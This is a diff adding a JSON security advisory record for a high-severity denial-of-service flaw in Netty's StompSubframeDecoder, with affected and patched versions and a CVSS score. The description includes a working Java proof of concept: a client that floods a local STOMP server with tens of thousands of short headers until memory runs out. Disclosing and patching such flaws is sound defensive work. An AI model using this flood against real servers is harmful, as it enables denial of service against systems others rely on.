@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-07-14T20:16:37Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec-stomp"
+  },
+  "Advisory": {
+    "DatabaseId": 372404,
+    "Id": "GSA_kwCzR0hTQS12aGNoLTJ3ZjMtbThycM4ABa60",
+    "GhsaId": "GHSA-vhch-2wf3-m8rp",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-vhch-2wf3-m8rp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-vhch-2wf3-m8rp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-44891"
+      }
+    ],
+    "Description": "### Summary\nThe StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, allowing an attacker to cause an OutOfMemoryError, leading to a Denial of Service.\n\n### Details\n`io.netty.handler.codec.stomp.StompSubframeDecoder` implements the STOMP protocol. The `maxLineLength` parameter restricts the length of individual header lines, but there is no mechanism to limit the total number of headers in a single STOMP frame. An attacker can send a large number of short headers (e.g., `a: 1\\n`), which are accumulated in memory inside the `DefaultStompHeadersSubframe` until the JVM throws an OutOfMemoryError.\n\n### PoC\nRun the server with `-Xmx256m`\n\n```java\npublic final class ServerApp {\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            ChannelFuture serverFuture = new ServerBootstrap()\n                    .group(group)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new StompSubframeDecoder())\n                    .bind(8080)\n                    .sync();\n            serverFuture.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```\n\n```java\npublic final class ClientApp {\n    public static void main(String[] args) throws Exception {\n        try (Socket socket = new Socket(\"127.0.0.1\", 8080)) {\n            OutputStream out = socket.getOutputStream();\n\n            out.write(\"CONNECT\\n\".getBytes(StandardCharsets.UTF_8));\n\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i \u003c 1000; i++) {\n                sb.append(\"a:1\\n\");\n            }\n            byte[] bulkHeaders = sb.toString().getBytes(StandardCharsets.UTF_8);\n\n            for (int i = 1; i \u003c= 50_000; i++) {\n                out.write(bulkHeaders);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### Impact\nDenial of Service: An attacker can easily exhaust the server's memory by sending a single malicious STOMP message. Any server exposing a STOMP endpoint based on StompSubframeDecoder is vulnerable to DoS.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-14T20:16:34Z",
+    "Severity": "HIGH",
+    "Summary": "Netty: Denial of Service via Unbounded Headers in StompSubframeDecoder",
+    "UpdatedAt": "2026-07-14T20:16:37Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.1.136.Final"
+      },
+      "VulnerableVersionRange": "\u003c= 4.1.135.Final"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.2.16.Final"
+      },
+      "VulnerableVersionRange": "\u003e= 4.2.0.Alpha1, \u003c= 4.2.15.Final"
+    }
+  ]
+}
